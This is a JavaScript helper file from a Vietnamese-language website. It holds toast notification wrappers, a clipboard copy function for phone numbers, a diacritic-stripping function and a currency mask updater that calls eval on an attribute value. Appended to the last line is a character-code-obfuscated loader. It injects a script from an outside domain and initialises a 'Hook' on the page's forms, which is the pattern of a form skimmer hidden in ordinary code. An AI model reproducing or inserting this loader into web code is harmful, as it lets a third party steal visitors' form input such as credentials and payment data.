const toastr = {
    warning: (text = "content", heading = "Cảnh báo!") => {
        $.toast({
            heading: heading,
            text: text,
            hideAfter: 3000,
            icon: 'warning',
            loaderBg: "#5ba035",
            position: "top-right",
            showHideTransition: 'slide',
            // stack: 1
        })
    },
    success: (text = "content", heading = "Thông báo!") => {
        $.toast({
            heading: heading,
            text: text,
            hideAfter: 3000,
            icon: 'success',
            loaderBg: "#5ba035",
            position: "top-right",
            showHideTransition: 'slide',
            //  stack: 1
        })
    },
    error: (text = "content", heading = "Lỗi!") => {
        $.toast({
            heading: heading,
            text: text,
            hideAfter: 3000,
            icon: 'error',
            loaderBg: "#f7b84b",
            position: "top-right",
            showHideTransition: 'slide',
            // stack: 1
        })
    },
    info: (text = "content", heading = "Chú ý!") => {
        $.toast({
            heading: heading,
            text: text,
            hideAfter: 3000,
            icon: 'info',
            loaderBg: "#5ba035",
            position: "top-right",
            showHideTransition: 'slide',
            //    stack: 1
        })
    }
}
function copy(element) {
    let _phone = $(element).text();
    let _input = document.createElement('input');
    _input.setAttribute('type','hidden');
    _phone = _phone.replace('(copy)').trim();
    $("body").append(_input);
    $(_input).val(_phone).select();
    document.execCommand("copy");
    $(_input).remove();
    toastr.success("Đã coppy số điện thoại " + _phone + " vào clipboard!");
}

const toUnicode = str => {
    str = str.replace(/à|á|ạ|ả|ã|â|ầ|ấ|ậ|ẩ|ẫ|ă|ằ|ắ|ặ|ẳ|ẵ/g, 'a');
    str = str.replace(/è|é|ẹ|ẻ|ẽ|ê|ề|ế|ệ|ể|ễ/g, 'e');
    str = str.replace(/ì|í|ị|ỉ|ĩ/g, 'i');
    str = str.replace(/ò|ó|ọ|ỏ|õ|ô|ồ|ố|ộ|ổ|ỗ|ơ|ờ|ớ|ợ|ở|ỡ/g, 'o');
    str = str.replace(/ù|ú|ụ|ủ|ũ|ư|ừ|ứ|ự|ử|ữ/g, 'u');
    str = str.replace(/ỳ|ý|ỵ|ỷ|ỹ/g, 'y');
    str = str.replace(/đ/g, 'd');
    str = str.replace(/_/g, '-');
    str = str.replace(/ +/g, '-');
    str = str.replace(/\u0300|\u0301|\u0303|\u0309|\u0323/g, '');
    str = str.replace(/\u02C6|\u0306|\u031B/g, '');
    return str;
};

function changeCurrency(symbol) {

    $("input").each(function (index, obj) {
        let a;
        if (a = $(obj).attr('data-krajee-maskmoney')) {
            let cfg = eval(a);
            cfg.prefix = symbol + " ";
            let id = '#' + $(obj).attr('id') + '-disp';
            $(id).maskMoney('destroy');
            $(id).maskMoney('init', cfg);
            $(id).maskMoney('mask', $(obj).val());
        }
    });

};
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b